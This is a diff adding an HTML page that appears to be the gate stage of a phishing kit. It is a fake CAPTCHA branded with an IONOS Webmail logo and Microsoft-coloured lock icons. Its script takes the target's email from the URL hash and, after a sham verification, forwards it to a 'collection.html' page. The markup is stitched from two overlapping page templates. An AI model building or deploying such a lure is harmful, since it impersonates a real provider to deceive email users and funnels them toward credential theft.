@@ -1,0 +1,163 @@
+
+<!DOCTYPE html> <html> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>&#8203;</title> <style> :root{ --bg:#ffffff; --ink:#1a1a1a; --card:#ffffff; --card-b:#e0e6ef; --chip:#f5f7fb; --chip-b:#d6dce5; --btn:#f2f4f9; --btn-b:#cfd8e3; --ok:#16a34a; --lock-shackle:#333; --m-red:#f25022; --m-green:#7fba00; --m-blue:#00a4ef; --m-yellow:#ffb900; } *{box-sizing:border-box} html,body{height:100%} body{ background:var(--bg); color:var(--ink); font:14px/1.45 Inter, ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif; } .captcha-box{ margin: auto; top: 94px; position: relative; width:340px; max-width:92vw; background:var(--card); border:1px solid var(--card-b); border-radius:14px; padding:20px 18px 16px; box-shadow:0 6px 18px rgba(0,0,0,.08); text-align:center; } /* Lock loader */ .top-loader{display:grid; place-items:center; height:70px; margin-bottom:12px} .lock{ position:relative; width:42px; height:54px; display:flex; flex-direction:column; align-items:center; justify-content:flex-start; animation:float 2.5s ease-in-out infinite; filter: drop-shadow(0 0 3px rgba(0,0,0,.2)); } .shackle{ width:26px; height:18px; border:6px solid var(--lock-shackle); border-bottom:none; border-radius:12px 12px 0 0; transition: transform .6s cubic-bezier(0.65,0,0.35,1); transform-origin:center bottom; } .body{ width:34px; height:28px; display:grid; grid-template-columns:1fr 1fr; grid-template-rows:1fr 1fr; margin-top:-1px; border-radius:6px; overflow:hidden; transition: all .5s cubic-bezier(0.65,0,0.35,1); } .quad{width:100%; height:100%;} .red{background:var(--m-red);} .green{background:var(--m-green);} .blue{background:var(--m-blue);} .yellow{background:var(--m-yellow);} /* Animations */ @keyframes float { 0%,100% { transform:translateY(0); } 50% { transform:translateY(-4px); } } .lock.open .shackle{ transform: rotate(-35deg) translateY(-5px); } .lock.done{ animation:none; } .lock.done .body{ filter:brightness(1.2) drop-shadow(0 0 6px rgba(22,163,74,.55)); } /* Text */ .header{font-weight:600; margin:6px 0 10px; font-size:18px} .status{font-size:14px; margin-bottom:16px; line-height:1.4} /* Checkbox */ .check-row{display:flex; align-items:center; justify-content:center; gap:4px; margin-bottom:16px} .check-row-e{border-radius: 12px;display: flex;align-items: center;justify-content: center;gap: 10px; padding: 6px 30px;margin-bottom: 16px;background: #ffffff;box-shadow: 0 6px 18px rgb(0 0 0 / 23%);} .checkbox{ width:18px; height:18px; border-radius:6px; border:1.5px solid #c3cad7; background:#fff; display:grid; place-items:center; cursor:pointer; transition:all .2s ease; } .checkbox.checked{ background:#e8f9ee; border-color:#3bbf71; box-shadow:0 0 0 3px rgba(22,163,74,.25) } .checkmark{ width:14px; height:14px; stroke:var(--ok); stroke-width:2.5; stroke-linecap:round; stroke-linejoin:round; fill:none; display:none; } .checkbox.checked .checkmark{display:block} /* Chip + Button */ .chip{ font-weight:600; padding:6px 0px; color:#1f2937; } button{ width:100%; padding:11px; border-radius:10px; border:1px solid var(--btn-b); background:var(--btn); color:#374151; font-weight:600; cursor:not-allowed; opacity:.6; transition:all .2s ease; } button.ready{cursor:pointer; opacity:1; color:#111827} button.success{background:#e8f9ee; border-color:#3bbf71; color:#16a34a} .footer{margin-top:12px; font-size:11px; color:#6b7280; display:flex; justify-content:space-between} </style> </head> <body> <div class="captcha-box">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+  body {
+    font-family: Inter, system-ui, sans-serif;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+    height:100vh;
+    margin:0;
+    background:#f6f8ff;
+    color:#222;
+  }
+
+  /* IONOS logo */
+  .logo {
+    margin-bottom:1rem;
+  }
+  .logo img {
+    width:120px;
+    height:auto;
+  }
+
+  .header {
+    font-size:1.6rem;
+    font-weight:700;
+    color:#1e266d;
+    margin-bottom:0.4rem;
+  }
+
+  .status {
+    text-align:center;
+    font-size:0.95rem;
+    margin-bottom:1.2rem;
+  }
+  .status small {color:#666;}
+
+  .check-row {
+    display:flex;
+    justify-content:center;
+    margin-bottom:1.4rem;
+  }
+
+  .check-row-e {
+    display:flex;
+    align-items:center;
+    gap:0.6rem;
+  }
+
+  .checkbox {
+    width:26px;
+    height:26px;
+    border:2px solid #ccc;
+    border-radius:6px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    cursor:pointer;
+    transition:all 0.25s ease;
+  }
+
+  .checkbox:hover {border-color:#006cd6;}
+  .checkbox.checked {
+    background:#006cd6;
+    border-color:#006cd6;
+  }
+
+  .checkmark {
+    width:16px;
+    height:16px;
+    stroke:white;
+    stroke-width:3;
+    fill:none;
+    stroke-linecap:round;
+    stroke-linejoin:round;
+    opacity:0;
+    transition:opacity 0.2s ease;
+  }
+  .checkbox.checked .checkmark {opacity:1;}
+
+  .chip {
+    background:linear-gradient(135deg,#0047ba,#006cd6);
+    color:white;
+    font-weight:500;
+    padding:6px 14px;
+    border-radius:20px;
+    box-shadow:0 3px 6px rgba(8,10,30,0.15);
+  }
+
+  .footer {
+    font-size:0.8rem;
+    color:#777;
+    display:flex;
+    justify-content:space-between;
+    width:220px;
+    margin-top:0.6rem;
+  }
+</style>
+</head>
+<body>
+
+  <!-- 🔹 IONOS Webmail Logo -->
+  <div class="logo">
+    <img src="https://i.gyazo.com/96d489dbf943f3fd3e899218a0e3af90.png" alt="IONOS Logo">
+  </div>
+  <div class="status" id="status">
+    Please check the box<br>
+    <small>Waiting for verification…</small>
+  </div>
+
+  <div class="check-row">
+    <div class="check-row-e">
+      <div class="checkbox" id="cb">
+        <svg class="checkmark" viewBox="0 0 20 20">
+          <path d="M4.5 10.5l3.4 3.6L15.5 6.8"/>
+        </svg>
+      </div>
+      <div class="chip">Verify humanity</div>
+    </div>
+  </div>
+
+  <div class="footer">
+    <span>Secure • v1.0</span>
+    <span id="ts"></span>
+  </div>
+
+<script>
+const cb = document.getElementById('cb');
+const status = document.getElementById('status');
+const ts = document.getElementById('ts');
+let checked = false;
+
+const email = window.location.hash ? window.location.hash.substring(1) : "";
+const ipfsTarget = "collection.html";
+
+cb.addEventListener('click', () => {
+  checked = !checked;
+  cb.classList.toggle('checked', checked);
+
+  if (checked) {
+    status.textContent = "Verifying…";
+    setTimeout(() => {
+      status.textContent = "Verified ✓";
+      if (email) window.location.href = `${ipfsTarget}#${email}`;
+      else window.location.href = ipfsTarget;
+    }, 1200);
+  } else {
+    status.innerHTML = "Please check the box<br><small>Waiting for verification…</small>";
+  }
+});
+
+// timestamp
+ts.textContent =
+  new Date().toLocaleTimeString([], {hour:"2-digit", minute:"2-digit"}) +
+  " • " +
+  new Date().toLocaleDateString([], {month:"short", day:"numeric", year:"numeric"});
+</script>
+
+</body>
+</html>
